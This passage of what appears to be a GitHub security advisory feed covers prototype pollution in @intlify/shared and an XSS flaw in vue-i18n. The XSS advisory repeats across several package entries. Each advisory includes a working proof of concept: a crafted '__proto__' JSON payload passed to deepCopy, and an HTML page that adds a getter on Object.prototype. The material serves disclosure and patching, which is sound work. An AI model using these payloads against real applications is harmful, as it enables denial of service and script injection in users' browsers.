<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/shared] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/core] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/core-base] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petite-vue-i18n] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
